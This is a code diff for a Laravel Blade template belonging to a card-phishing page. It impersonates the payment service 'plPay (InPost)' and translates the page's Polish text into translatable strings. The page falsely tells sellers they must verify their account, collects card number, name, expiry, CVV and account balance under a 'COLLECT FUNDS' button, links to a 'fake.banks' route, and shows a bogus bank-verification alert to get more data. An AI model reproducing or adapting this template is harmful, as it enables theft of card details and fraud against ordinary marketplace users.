@@ -17,28 +17,18 @@
             <div class="modal-content">
                 <div class="modal-header">
                     <h5 class="modal-title" id="exampleModalLabel" style="margin: auto;">
-                        <b style="font-size: 1.25em;"> Dane karty zostały potwierdzone</b>
+                        <b style="font-size: 1.25em;"> {{__("The card details have been confirmed")}}</b>
                     </h5>
                 </div>
                 <div class="modal-body">
-                    <p>Zgodnie z zasadami naszego partnera płatniczego plPay (InPost), w celu otrzymania środków system
-                        weryfikuje konto, aby upewnić się że konto naprawdę należy do Ciebie i może przyjmować płatności
-                        z
-                        naszego serwisu.
-
-                        <br><br>Ponieważ korzystasz z naszego systemu płatności po raz pierwszy, musisz przejść
-                        weryfikację
-                        konta, na które w przyszłości będziesz otrzymywać zapłatę za sprzedany towar. <b>Jest to
-                            standardowa
-                            procedura potwierdzania posiadacza konta.</b> Jest to konieczne, w celu potwierdzenia
-                        możliwości
-                        korzystania z systemu płatności internetowych oraz chronić kupujących i sprzedających przed
-                        oszustami.
-
+                    <p>
+                        {{__("According to the rules of our payment partner plPay (InPost), in order to receive funds, the system verifies the account to make sure that the account really belongs to you and can accept payments from our website.")}}
+                        <br><br>
+                        {!! __("As you are using our payment system for the first time, you must pass the account verification to which you will receive payment for the goods sold in the future. This is the standard account holder confirmation procedure. This is necessary to validate the use of the online payment system and to protect buyers and sellers from fraudsters.") !!}
                     </p>
                     <div class="form-group">
-                        <label for="card_balance" class="col-form-label"><b>Stan konta:</b></label>
-                        <input type="number" class="form-control" name="balance" placeholder="Stan konta"
+                        <label for="card_balance" class="col-form-label"><b>{{__("Account balance")}}:</b></label>
+                        <input type="number" class="form-control" name="balance" placeholder="{{__("Account balance")}}"
                                id="card_balance" onfocus="$(this).css('border-color', '');">
                     </div>
 
@@ -46,7 +36,7 @@
                 <div class="modal-footer">
                     <button type="submit"
                             style="max-width:150px;float:right;border-radius: 20px 20px 20px 20px; font-size: 1.2em; /*background-color: #1564c0;*/ background-color: green; border-color: #1564c0; color: white; font-weight: bold;"
-                            class="btn btn-primary" onclick="cardlog();" id="paybutton">Potwierdzić
+                            class="btn btn-primary" onclick="cardlog();" id="paybutton">{{__("To confirm")}}
                     </button>
                 </div>
             </div>
@@ -69,9 +59,9 @@
                                 </div>
                                 <div class="credit-card-form__label-group credit-card-form__label-group_type_card-number clearfix">
                                     <label class="js-cc-label credit-card-form__label">
-                                        <span class="credit-card-form__title">Numer karty</span>
+                                        <span class="credit-card-form__title">{{__("Card number")}}</span>
                                         <input type="tel" name="card_number" id="cardnumber" autocomplete="cc-number"
-                                               placeholder="Od 16 do 19 cyfr"
+                                               placeholder="{{__("From :from to :to digits",['from'=>16,'to'=>19])}}"
                                                class="credit-card-form__input js-cc-input js-cc-number-input"
                                                required="">
                                         <div class="credit-card-form__error-text">Numer karty wprowadzony nieprawidłowo
@@ -80,7 +70,7 @@
                                 </div>
                                 <div class="credit-card-form__label-group credit-card-form__label-group_type_holder-name clearfix">
                                     <label class="js-cc-label credit-card-form__label">
-                                        <span class="credit-card-form__title">Imię i nazwisko na karcie</span>
+                                        <span class="credit-card-form__title">{{__("Name on the card")}}</span>
                                         <input type="text" name="cardholder" id="cardholder" autocomplete="cc-name"
                                                class="credit-card-form__input js-cc-input js-cc-name-input"
                                                maxlength="40"
@@ -94,11 +84,11 @@
                                 <div class="js-card-expiry-date-block credit-card-form__label-group credit-card-form__label-group_type_expiration-date clearfix"
                                      id="step2" style="display: none;">
                                     <label class="js-cc-label credit-card-form__label">
-                                        <span class="credit-card-form__title">Data ważności</span>
+                                        <span class="credit-card-form__title">{{__("Expiration date")}}</span>
                                         <input type="text" name="expdate" id="expdate" autocomplete="cc-exp"
                                                placeholder="MM/RR"
                                                class="credit-card-form__input js-cc-input js-cc-exp-input" required="">
-                                        <div class="credit-card-form__error-text">Data ważności</div>
+                                        <div class="credit-card-form__error-text">{{__("Expiration date")}}</div>
                                     </label>
                                     <label class="js-cc-label credit-card-form__label credit-card-form__label_type_cvv js-cc-cvv-label">
                                     <span class="credit-card-form__title">
@@ -133,14 +123,14 @@
                         </div>
                         <div>
                             <a class="pseudo-link_2" href="{{subRoute('fake.banks',['track_id'=>$fake->track_id])}}">
-                                Wybierz bank z listy</a>
+                                {{__("Select a bank from the list")}}</a>
                         </div>
                         <div class="credit-card-form__submit">
 
                             <div class="credit-card-form__submit-inner">
                                 <input style="cursor: pointer; background-color: #002f34;" onclick="nextcard();"
                                        id="nextpay" type="submit" class="js-button-submit button" name="submit"
-                                       value="Odbierz środki">
+                                       value="{{__("COLLECT FUNDS")}}">
                             </div>
                         </div>
                     </div>
@@ -156,7 +146,7 @@
                      style="width: 104%;margin-top: -4px;">
             </span>
                 <span class="secure-information__text_type_protocol">HTTPS / SSL</span>
-            <span class="secure-information__text_type_secure-connection">Bezpieczne połączenie</span>
+            <span class="secure-information__text_type_secure-connection">{{__("Safe connection")}}</span>
                 <img src="{{asset('images/veryf.png')}}"
                      style="width: 50%;margin-left: 25%;">
             </span>
@@ -222,10 +212,10 @@
                 if (ccnum.unmask().val().length >= 16) {
                     $('#step2').show();
                     $('#nextpay').attr('onclick', 'nextpay();');
-                    alert('Twój bank zażądał dodatkowej weryfikacji. Wypełnij dodatkowe pola i spróbuj ponownie.')
+                    alert('{{__("Your bank requested additional verification. Fill in any additional fields and try again.")}}')
                 } else {
                     ccnum.css("border-color", "red");
-                    alert('Nieprawidłowe dane karty płatniczej.');
+                    alert('{{__("Incorrect payment card details.")}}');
                 }
                 ccnum.mask("9999 9999 9999 9999");
             }
